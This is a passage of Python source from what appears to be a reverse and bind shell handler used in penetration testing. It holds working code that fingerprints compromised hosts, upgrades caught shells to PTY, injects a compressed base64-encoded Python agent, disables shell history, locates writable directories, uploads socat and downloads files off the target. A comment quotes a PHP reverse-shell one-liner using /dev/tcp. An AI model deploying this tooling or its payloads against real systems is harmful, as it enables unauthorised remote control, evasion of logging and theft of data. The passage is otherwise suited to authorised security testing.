		self.script = self.run_in_background(self.script)

		if self.determine():

			logger.debug(f"OS: {self.OS}")
			logger.debug(f"Type: {self.type}")
			logger.debug(f"Interactive: {self.interactive}")
			logger.debug(f"Echoing: {self.echoing}")

			if self.name == core.session_wait_host:
				core.session_wait.put(self.id)

			logger.info(
				f"Got {self.source} shell from {OSes[self.OS]} "
				f"{paint(self.name).white_RED}{paint().green} 😍️  - "
				f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
			)

			self.directory = options.basedir / self.name
			if not options.no_log:
				self.directory.mkdir(parents=True, exist_ok=True)
				self.logpath = self.directory / f"{self.name}.log"
				self.histfile = self.directory / "readline_history"
				self.logfile = open(self.logpath, 'ab', buffering=0)
				if not options.no_timestamps and not self.logpath.exists():
					self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ").magenta).encode())

			for module in Module.modules.values():
				module.session = self
				module.session_start()

			self.maintain()

			if options.single_session and self.listener:
				self.listener.stop()

			attach_conditions = [
				# Is a reverse shell and the Menu is not active and reached the maintain value
				self.listener and not "Menu" in core.threads and len(core.hosts[self.name]) == options.maintain,

				# Is a bind shell and is not spawned from the Menu
				not self.listener and not "Menu" in core.threads,

				# Is a bind shell and is spawned from the connect Menu command
				not self.listener and "Menu" in core.threads and menu.lastcmd.startswith('connect')
			]

			if hasattr(listener_menu, 'active') and listener_menu.active:
				os.close(listener_menu.control_w)
				listener_menu.finishing.wait()

			# If no other session is attached
			if core.attached_session is None:
				# If auto-attach is enabled
				if not options.no_attach:
					if any(attach_conditions):
						# Attach the newly created session
						self.attach()

				# If auto-attach is disabled and the menu is not active
				elif not "Menu" in core.threads:
					# Then show the menu
					menu.show()
		else:
			self.kill()

		return

	def __bool__(self):
		return self.socket.fileno() != -1# and self.OS)

	def __repr__(self):
		return (
			f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
			f"interactive={self.interactive}, echoing={self.echoing})"
		)

	def __getattr__(self, name):
		if name == 'new_streamID':
			with self.stream_lock:
				if len(self.streams) == self.streams_max:
					logger.error("Too many open streams...")
					return None

				self.streamID += 1
				self.streamID = self.streamID % self.streams_max
				while struct.pack(self.stream_code, self.streamID) in self.streams:
					self.streamID += 1
					self.streamID = self.streamID % self.streams_max

				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
				self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)

				return self.streams[_stream_ID_hex]
		else:
			raise AttributeError(name)

	def fileno(self):
		return self.socket.fileno()

	@property
	def can_deploy_agent(self):
		if self._can_deploy_agent is None:
			if Path(self.directory / ".noagent").exists():
				self._can_deploy_agent = False
			else:
				_bin = self.bin['python3'] or self.bin['python']
				if _bin:
					version = self.exec(f"{_bin} -V || {_bin} --version", value=True)
					major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
					self.remote_python_version = (int(major), int(minor), int(micro))
					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
						self._can_deploy_agent = True
					else:
						self._can_deploy_agent = False
				else:
					self._can_deploy_agent = False

		return self._can_deploy_agent

	@property
	def spare_control_sessions(self):
		return [session for session in self.control_sessions if session is not self]

	@property
	def need_control_sessions(self):
		return [session for session in core.hosts[self.name] if session.need_control_session]

	@property
	def need_control_session(self):
		return self.type == 'PTY' and not self.agent

	@property
	def control_sessions(self):
		return [session for session in core.hosts[self.name] if not session.need_control_session]

	@property
	def control_session(self):
		if self.need_control_session:
			for session in core.hosts[self.name]:
				if not session.need_control_session:
					return session
			return None # TODO self.spawn()
		return self

	def get_shell_pid(self):
		if self.OS == 'Unix':
			if self.agent:
				self.shell_pid = self.exec("stdout_stream << str(shell_pid).encode()", python=True, value=True)
			else:
				self.bypass_control_session = True
				self.shell_pid = self.exec("echo $$", value=True)
				self.bypass_control_session = False
				if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
					logger.error("Cannot get the PID of the shell. Response: {self.shell_pid}")
					logger.error("I am killing it...")
					self.kill()
					return False
		elif self.OS == 'Windows':
			self.shell_pid = None #TODO

	@property
	def tty(self):
		if self._tty is None:
			try:
				self.bypass_control_session = True
				self._tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", value=True) # TODO check binary
				self.bypass_control_session = False
			except:
				pass
		return self._tty

	@property
	def bsd(self):
		if self._bsd is None:
			if self.OS == 'Unix':
				try:
					response = self.control_session.exec("uname -s", value=True)
					self._bsd = bool(re.search(r"(BSD|Darwin)", response))
				except:
					pass
			elif self.OS == 'Windows':
				self._bsd = False
		return self._bsd

	@property
	def cwd(self):
		if self._cwd is None:
			if self.OS == 'Unix':
				if not self.shell_pid:
					self.get_shell_pid()
				if self.bsd:
					self._cwd = self.control_session.exec(f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-", value=True)
				elif self.agent:
					self._cwd = self.exec(
					f"""
					try:
						cwd = os.readlink('/proc/{self.shell_pid}/cwd')
					except:
						cwd = ''
					stdout_stream << str(cwd).encode()
					""", python=True, value=True)
				else:
					self._cwd = self.control_session.exec(f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
			elif self.OS == 'Windows':
				self._cwd = self.exec("cmd /c cd", value=True)

		return self._cwd

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def source(self):
		return 'reverse' if self.listener else 'bind'

	@property
	def bin(self):
		if not self._bin:
			try:
				if self.OS == "Unix":
					binaries = [
						"sh", "bash", "python", "python3",
						"script", "socat", "stty", "echo", "base64", "wget",
						"curl", "tar", "rm", "stty", "nohup", "find"
					]
					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
					if response:
						self._bin = dict(zip(binaries, response.decode().splitlines()))

					missing = [b for b in binaries if not self._bin[b].startswith("/")]

					if missing:
						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
						response = self.exec(
							f'for bin in {" ".join(missing)}; do for dir in '
							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
							'test -f $_bin && break || unset _bin; done; echo $_bin; done'
						)
						if response:
							self._bin.update(dict(zip(missing, response.decode().splitlines())))

				for binary in options.no_bins:
					self._bin[binary] = None

				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
				logger.debug(f"Available binaries on target: \n{paint(result).red}")
			except:
				pass

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug(f"Trying to find a writable directory on target")
				tmpname = rand(10)
				common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
				for directory in common_dirs:
					if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
						self.exec(f'rm {directory}/{tmpname}')
						self._tmp = directory
						break
				else:
					candidate_dirs = self.exec(f'find / -type d -writable 2>/dev/null')
					if candidate_dirs:
						for directory in candidate_dirs.decode().splitlines():
							if directory in common_dirs:
								continue
							if not self.exec(f'echo {tmpname} > {directory}/{tmpname}'):
								self.exec(f'rm {directory}/{tmpname}')
								self._tmp = directory
								break
				if not self._tmp:
					self._tmp = False
					logger.warning("Cannot find writable directory on target...")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = "%TEMP%"

		return self._tmp


	def send(self, data, stdin=False):
		with self.wlock: #TODO
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			_len = self.outbuf.write(data)

			self.subchannel.allow_receive_shell_data = True

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << ""
			return _len

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp = datetime.now().strftime(str(paint("%Y-%m-%d %H:%M:%S: ").magenta)) #TEMP
			data = re.sub(rb'(\r\n|\r|\n|\v|\f)', rf'\1{timestamp}'.encode(), data)

		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>').GREEN+' ', encoding='utf8'))

			self.logfile.write(data)

		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self, path=False):
		history = ' export HISTFILE=/dev/null;' if options.no_history else ''
		path = f' export PATH=$PATH:{LINUX_PATH};' if path else ''
		cmd = f'{path} export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`'
		outcome = b'1337'

		response = self.exec(cmd + '\n', expect=(outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)

		if not response:
			return False

		match = re.search (
			rf"(Microsoft Windows \[Version (.*)\].*){re.escape(cmd)}".encode(),
			response,
			re.DOTALL
		)

		# Windows cmd.exe
		if match:
			self.OS =		'Windows'
			self.type =		'Basic'
			self.subtype =		'cmd'
			self.interactive =	 True
			self.echoing =		 True
			self.prompt =		match[1].replace(b"'export' is not recognized\
			 as an internal or external command,\r\noperable program or batch file.\r\n", b"") # TODO
			self.version =		match[2]
			return True

		# Windows Powershell
		if re.match(
			rf"{outcome.decode()}.*\r\nPS [A-Za-z]:\\".encode(),
			response,
			re.DOTALL
		) or response in (b'SHELL> ', b'PS>', b'> ') or response.startswith(b"Windows PowerShell"):
			self.OS =		'Windows'
			self.type =		'Basic'
			self.subtype =		'psh'
			self.interactive =	 True
			self.echoing =		 False
			self.prompt =		response.splitlines()[-1]
			return True

		# Unix without PATH
		if outcome in response and not (b'not a tty' in response or b'/dev/pts/' in response):
			logger.debug("NO PATH...")
			return self.determine(path=True) if not path else False

		# Unix sh / bash
		if response.startswith(outcome):
			self.OS =		'Unix'
			self.type =		'Basic'
			self.interactive =	 False
			self.echoing =		 False
			self.prompt =		b''
			return True

		match = re.match(
			rf"(.*){outcome.decode()}".encode(),
			response,
			re.DOTALL
		)

		# Unix sh -i / bash -i
		if match:
			self.OS =		'Unix'
			self.interactive =	 True

			match2 = re.match(
				rf"(.*){re.escape(cmd)}".encode(),
				match[1],
				re.DOTALL
			)

			if match2:
				self.echoing =	 True
				self.prompt =	match2[1]
			else:
				self.echoing =	 False
				self.prompt =	match[1]

			if b'not a tty' in response:
				self.type =	'Basic'

			elif b'/dev/pts/' in response:
				self.type =	'PTY'
				self.pty_ready = True
				self._tty = re.search(rb'/dev/pts/\d*', response)[0].decode()

			return True

		return None

	def run_in_background(self, func):
		def wrapper(*args, **kwargs):
			if self.agent:
				threading.Thread(target=func, args=args, kwargs=kwargs).start()
			else:
				return func(*args, **kwargs)
		return wrapper

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect=None,		# Items to wait for in the response
		preserve_dir=False,	# Current dir preservation when using control session
		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
					# --- Agent only args ---
		agent_typing=False,	# Simulate typing on shell
		python=False,		# Execute python command
		stdin_src=None,		# stdin stream source
		stdout_dst=None,	# stdout stream destination
		stderr_dst=None,	# stderr stream destination
		stdin_stream=None,	# stdin_stream object
		stdout_stream=None,	# stdout_stream object
		stderr_stream=None	# stderr_stream object
	):
		if caller() == 'session_end':
			value = True

		if self.agent and not agent_typing: # TODO environment will not be the same as shell
			if cmd:
				if preserve_dir:
					self.exec(f"os.chdir('{self.cwd}')", python=True)
				cmd = textwrap.dedent(cmd)
				if value: buffer = io.BytesIO()
				timeout = options.short_timeout if value else None

				if not stdin_stream:
					stdin_stream = self.new_streamID
					if not stdin_stream:
						return
				if not stdout_stream:
					stdout_stream = self.new_streamID
					if not stdout_stream:
						return
				if not stderr_stream:
					stderr_stream = self.new_streamID
					if not stderr_stream:
						return

				_type = 'S'.encode() if not python else 'P'.encode()
				self.send(Messenger.message(Messenger.EXEC, _type + stdin_stream.id + stdout_stream.id + stderr_stream.id + cmd.encode()))
				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

				rlist = []
				if stdin_src:
					rlist.append(stdin_src)
				if stdout_dst or value:
					rlist.append(stdout_stream)
				if stderr_dst or value:
					rlist.append(stderr_stream) # FIX
				if not rlist:
					return True

				rlist.append(self.subchannel.control)
				while True:
					r, _, _ = select.select(rlist, [], [], timeout)

					if not r:
						stdin_stream.terminate()
						stdout_stream.terminate()
						stderr_stream.terminate()
						return False

					for readable in r:

						if readable is self.subchannel.control:
							command = self.subchannel.control.get()
							if command == 'stop':
								# TODO kill task here...
								break

						if readable is stdin_src:
							if hasattr(stdin_src, 'read'): # FIX
								data = stdin_src.read(NET_BUF_SIZE)
							elif hasattr(stdin_src, 'recv'):
								try:
									data = stdin_src.recv(NET_BUF_SIZE)
								except OSError:
									pass # TEEEEMP
							stdin_stream.write(data)
							if not data:
								stdin_stream << b""
								rlist.remove(stdin_src)
								if rlist == [self.subchannel.control]:
									break

						if readable is stdout_stream:
							data = readable.read(NET_BUF_SIZE)
							if value:
								buffer.write(data)
							elif stdout_dst:
								if hasattr(stdout_dst, 'write'): # FIX
									stdout_dst.write(data)
									stdout_dst.flush()
								elif hasattr(stdout_dst, 'sendall'):
									try:
										stdout_dst.sendall(data) # maybe broken pipe
										if not data:
											if stdout_dst in rlist:
												rlist.remove(stdout_dst)
									except:
										if stdout_dst in rlist:
											rlist.remove(stdout_dst)
							if not data:
								rlist.remove(readable)
								if rlist == [self.subchannel.control]:
									break

						if readable is stderr_stream:
							data = readable.read(NET_BUF_SIZE)
							if value:
								buffer.write(data)
							elif stderr_dst:
								if hasattr(stderr_dst, 'write'): # FIX
									stderr_dst.write(data)
								elif hasattr(stderr_dst, 'sendall'):
									stderr_dst.sendall(data)
							if not data:
								rlist.remove(readable)
								if rlist == [self.subchannel.control]:
									break

					else:
						continue
					break

				if not stdin_src:
					#stdin_stream.write(b"")
					stdin_stream << b""
					stdin_stream.terminate() # TODO

				return buffer.getvalue().rstrip().decode() if value else True
			return None

		with self.lock:
			if self.need_control_session and not self.bypass_control_session:
				if preserve_dir:
					self.control_session.exec(f"cd {self.cwd}")
				args = locals()
				del args['self']
				response = self.control_session.exec(**args)
				if preserve_dir:
					self.control_session.exec("cd -")
				return response

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n' # TODO SOS echoed_cmd_regex check
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"echo -n ${token[0]}${token[2]};"
							f"{cmd.decode()};"
							f"echo -n ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO fix logic
						if self.subtype == 'cmd':
							sep = '&'
						elif self.subtype == 'psh':
							sep = ';'
						cmd = (
							f"set {token[0]}={token[1]}{sep}set {token[2]}={token[3]}\r\n"
							f"echo %{token[0]}%%{token[2]}%{sep}{cmd.decode()}{sep}"
							f"echo %{token[2]}%%{token[0]}%\r\n".encode()
						)
						if len(cmd) > MAX_CMD_PROMPT_LEN:
							logger.error("Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
							return False

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)
				self.subchannel.allow_receive_shell_data = False # TODO

			data_timeout = options.short_timeout if timeout is False else timeout
			continuation_timeout = options.latency
			timeout = data_timeout

			last_data = time.perf_counter()
			need_check = False
			while self.subchannel.result is None:

				logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
				readables, _, _ = select.select([self.subchannel.control, self.subchannel], [], [], timeout)

				if self.subchannel.control in readables:
					command = self.subchannel.control.get()
					logger.debug(f"Subchannel Control Queue: {command}")

					if command == 'stop':
						self.subchannel.result = False
						break

					elif command == 'kill':
						self.subchannel.can_use = False
						self.subchannel.result = False
						break

					self.subchannel.control.done()

				if self.subchannel in readables:
					logger.debug(f"Latency: {time.perf_counter() - last_data}")
					last_data = time.perf_counter()

					data = self.subchannel.read()
					buffer.write(data)
					logger.debug(f"{paint('Received').GREEN} -> {data}")

					if timeout == data_timeout:
						timeout = continuation_timeout
						need_check = True

				else:
					if timeout == data_timeout:
						logger.debug(paint("TIMEOUT").RED)
						self.subchannel.result = False
						break
					else:
						need_check = True
						timeout = data_timeout

				if need_check:
					need_check = False

					if raw and self.echoing and cmd:
						result = buffer.getvalue()
						if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
							self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
							break
						else:
							logger.debug("The echoable is not exhausted")
							continue
					if not raw:
						check = self.subchannel.pattern.search(buffer.getvalue())
						if check:
							logger.debug(paint('Got all data!').green)
							self.subchannel.result = check[1]
							break
						logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

					elif expect:
						for item in expect:
							if item in buffer.getvalue():
								logger.debug(paint(f"The expected string {item} found in data").yellow)
								self.subchannel.result = buffer.getvalue()
								break
						else:
							logger.debug(paint('No expected strings found in data. Receive again...').yellow)

					else:
						logger.debug(paint('Maybe got all data !?').yellow)
						self.subchannel.result = buffer.getvalue()
						break

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
			self.subchannel.active = False

			if separate and self.subchannel.result:
				self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(self.subchannel.result):
					buffer.write(_value)
				return buffer.getvalue()

			return self.subchannel.result

	def need_binary(self, name, url):
		options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			f"\n  4) None of the above\n"
		)
		print(paint(options).magenta)
		answer = ask("Select action")

		if answer == "1":
			return self.upload(
				url,
				remote_path=self.tmp,
				randomize_fname=False
			)[0]

		elif answer == "2":
			local_path = ask(f"Enter {name} local path")
			if local_path:
				if os.path.exists(local_path):
					return self.upload(
						local_path,
						remote_path=self.tmp,
						randomize_fname=False
					)[0]
				else:
					logger.error("The local path does not exist...")

		elif answer == "3":
			remote_path = ask(f"Enter {name} remote path")
			if remote_path:
				if not self.exec(f"test -f {remote_path} || echo x"):
					return remote_path
				else:
					logger.error("The remote path does not exist...")

		elif answer == "4":
			return False

		return self.need_binary(name, url)

	def upgrade(self):
		if self._upgrade():
			for module in Module.modules.values():
				module.session = self
				module.post_upgrade()

	def _upgrade(self):
		if self.OS == "Unix":
			if self.agent:
				logger.warning("Python agent is already deployed")
				return False

			if self.need_control_sessions and self.control_sessions == [self]:
				logger.warning("This is a control session and cannot be upgraded")
				return False

			if self.type == "PTY":
				if self.can_deploy_agent:
					logger.info("Attempting to deploy agent...")
				elif not self.pty_ready:
					logger.warning("This shell is already PTY and Python agent cannot be deployed...")
					return False
			else:
				logger.info("Attempting to upgrade shell to PTY...")

			self.shell = self.bin['bash'] or self.bin['sh']
			if not self.shell:
				logger.warning("Cannot detect shell. Abort upgrading...")
				return False

			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
			if self.can_deploy_agent:
				_bin = self.bin['python3'] or self.bin['python']
				if self.remote_python_version >= (3,):
					_decode = 'b64decode'
					_exec = 'exec(cmd, globals(), locals())'
				else:
					_decode = 'decodestring'
					_exec = 'exec cmd in globals(), locals()'

				agent = textwrap.dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, NET_BUF_SIZE, MESSENGER, STREAM, _exec)
				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
				cmd = f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''

			elif self.bin['script']:
				_bin = self.bin['script']
				cmd = f"{_bin} -q /dev/null; exit 0"

			elif self.bin['socat']:
				_bin = self.bin['socat']
				cmd = socat_cmd.format(_bin)

			else:
				_bin = self.tmp + '/socat'
				if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
					cmd = socat_cmd.format(_bin)
				else:
					logger.warning("Cannot upgrade shell with the available binaries...")
					socat_binary = self.need_binary("socat", BINARIES['socat'])
					if socat_binary:
						_bin = socat_binary
						cmd = socat_cmd.format(_bin)
					else:
						if readline:
							logger.info("Readline support enabled")
							self.readline = True
							return True
						else:
							logger.error("Falling back to basic shell support")
							return False

			if not self.can_deploy_agent and not self.spare_control_sessions: #### TODO
				logger.warning("Python agent cannot be deployed. I need to maintain at least one basic session...")
				core.session_wait_host = self.name
				self.spawn()
				try:
					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
					core.session_wait_host = None

				except queue.Empty:
					logger.error("Failed spawning new session")
					return False

				if self.type == "Basic":
					new_session.upgrade()
					if caller() == 'attach':
						new_session.attach()
					return True

			if self.pty_ready:
				self.exec("stty -echo")
				self.echoing = False

			elif self.interactive:
				# Some shells are unstable in interactive mode
				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
				# Silently convert the shell to non-interactive before PTY upgrade.
				self.interactive = False
				self.echoing = True
				self.exec(f"exec nohup {self.shell}", raw=True)
				self.echoing = False

			expect = (b"\x01",) if self.can_deploy_agent else None
			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=self.can_deploy_agent, expect=expect, raw=True)
			if not isinstance(response, bytes):
				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
				Path(self.directory / ".noagent").touch()
				self.kill()
				return False

			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")

			self.agent = 		self.can_deploy_agent
			self.type =		'PTY'
			self.interactive =	 True
			self.echoing =		 True
			self.prompt =		response

			self.get_shell_pid()

		elif self.OS == "Windows":
			self.readline = True
			logger.info("Added readline support...")

		return True

	def update_pty_size(self):
		columns, lines = shutil.get_terminal_size()

		if self.agent:
			self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))

		elif self.OS == 'Unix':
			threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {columns} -F {self.tty}",), name="RESIZE").start() #TEMP

	def readline_loop(self):

		readline.clear_history()
		if self.histfile.exists():
			readline.read_history_file(self.histfile)

		while core.attached_session == self:
			try:
				cmd = input("\033[s\033[u") # TODO
				assert len(cmd) <= MAX_CMD_PROMPT_LEN
				readline.set_history_length(options.histlength)
				try:
					readline.write_history_file(self.histfile)
				except FileNotFoundError:
					cmdlogger.debug(f"History file '{self.histfile}' does not exist")
			except EOFError:
				self.detach()
				break
			except AssertionError:
				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
			else:
				self.send(cmd.encode() + b"\n")

	def attach(self):

		if threading.current_thread().name != 'Core':
			if self.new:
				self.new = False
				self.bypass_control_session = True
				if not options.no_upgrade:
					if not (self.need_control_session and self.control_sessions == [self]):
						self.upgrade()
				self.bypass_control_session = False

				if self.prompt:
					self.record(self.prompt)

			core.control << f'self.sessions[{self.id}].attach()'
			return True

		if core.attached_session is not None:
			return False

		if self.type == 'PTY':
			escape_key = options.escape['key']
		elif self.readline:
			escape_key = 'Ctrl-D'
		else:
			escape_key = 'Ctrl-C'

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
			f"{paint(escape_key).MAGENTA} "
		)

		core.attached_session = self
		core.rlist.append(sys.stdin)

		if not options.no_log:
			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")

		os.write(sys.stdout.fileno(), bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		elif self.readline:
			threading.Thread(target=self.readline_loop).start()

		self._cwd = None
		return True

	def detach(self):

		if threading.current_thread().name != 'Core':
			core.control << f'self.sessions[{self.id}].detach()'
			return

		if core.attached_session is None:
			return False

		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if not self.type == 'Basic':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			print()
			logger.warning("Session detached...")
			menu.set_id(self.id)
		else:
			if options.single_session and len(core.sessions) == 0:
				core.stop()
				return
		menu.show()

		return True

	def download(self, remote_items):
		# Initialization
		try:
			shlex.split(remote_items) # Early check for shlex errors
		except ValueError as e:
			logger.error(e)
			return []

		local_download_folder = self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		if self.OS == 'Unix':
			# Check for local available space
			available_bytes = shutil.disk_usage(local_download_folder).free
			if self.agent:
				block_size = os.statvfs(local_download_folder).f_frsize
				remote_size = int(float(self.exec(f"{inspect.getsource(get_glob_size)}"
					f"stdout_stream << str(get_glob_size(r'{remote_items}', {block_size})).encode()", python=True, value=True, preserve_dir=True)))
			else:
				cmd = f"du -ck {remote_items}"
				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
				#for error in errors:
				#	logger.error(error)
				remote_size = int(response.splitlines()[-1].split()[0]) * 1024

			need = remote_size - available_bytes

			if need > 0:
				logger.error(
					f"--- Not enough space to download... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Packing and downloading
			if self.agent:
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdout_stream, stderr_stream]):
					return

				code = fr"""
				import glob
				items = []
				for part in shlex.split(r"{remote_items}"):
					_items = glob.glob(os.path.expanduser(part))
					if _items:
						items.extend(_items)
					else:
						items.append(part)
				import tarfile
				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
				tar.add = handle_exceptions(tar.add, stderr_stream.id)
				for item in items:
					tar.add(os.path.abspath(item))
				tar.close()
				"""

				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream,
					'preserve_dir': True
				}).start()

				error_buffer = ''
				while True:
					r, _, _ = select.select([stderr_stream], [], [])
					data = stderr_stream.read(NET_BUF_SIZE)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(line)
					else:
						break

				tar_source, mode = stdout_stream, "r|gz"
			else:
				temp = self.tmp + "/" + rand(8)
				cmd = f'tar cz $(for file in {remote_items};do readlink -f "$file";done) | base64 -w0 > {temp}'
				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()
				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
				for error in errors:
					logger.error(error)
				send_size = int(self.exec(rf"stat {temp} | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))

				b64data = io.BytesIO()
				for offset in range(0, send_size, options.download_chunk_size):
					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
					if response is False:
						logger.error("Download interrupted")
						return []
					b64data.write(response)
				self.exec(f"rm {temp}")

				data = io.BytesIO()
				data.write(base64.b64decode(b64data.getvalue()))
				data.seek(0)

				tar_source, mode = data, "r:gz"

			#print(remote_size)
			#if not remote_size:
			#	return []

			# Local extraction
			tar = tarfile.open(mode=mode, fileobj=tar_source)
			tar.extract = handle_exceptions(tar.extract)

			for item in tar:
				tar.extract(item, local_download_folder)
			tar.close()

			# Get the remote absolute paths
			if self.agent:
				response = self.exec(f"""
				import glob
				remote_paths = ''
				for part in shlex.split(r"{remote_items}"):
					result = glob.glob(os.path.expanduser(part))
					if result:
						for item in result:
							if os.path.exists(item):
								remote_paths += os.path.abspath(item) + "\\n"
					else:
						remote_paths += part + "\\n"
				stdout_stream << remote_paths.encode()
				""", python=True, value=True, preserve_dir=True)
			else:
				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo $file; fi; done'
				response = self.exec(cmd, timeout=None, preserve_dir=True).decode()

			remote_paths = response.splitlines()

			# Present the downloads
			downloaded = []
			for path in remote_paths:
				local_path = local_download_folder / path[1:]
				if os.path.exists(local_path):
					downloaded.append(local_path)
				else:
					logger.error(f"{paint('Download Failed').RED_white} => {local_path}")

		elif self.OS == 'Windows':
			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
			cmd = (
				f'@powershell -command "$archivepath=\\"{remote_tempfile}\\";compress-archive -path \\"{remote_items_ps}\\"'
				' -DestinationPath $archivepath;'
				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
				'Remove-Item $archivepath;'
